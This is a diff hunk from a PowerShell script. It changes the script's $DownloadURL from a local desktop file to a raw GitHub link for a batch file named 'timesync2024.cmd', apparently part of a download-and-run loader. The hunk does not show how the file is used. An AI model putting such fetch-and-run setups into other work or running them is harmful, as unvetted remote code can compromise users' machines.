@@ -2,7 +2,7 @@ $ErrorActionPreference = "Stop"
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'C:\Users\Anonymouss\Desktop\timesync2024.cmd'
+$DownloadURL = 'https://raw.githubusercontent.com/tamhq2/timesync/main/timesync2024.cmd'
 
 
 $rand = Get-Random -Maximum 1000
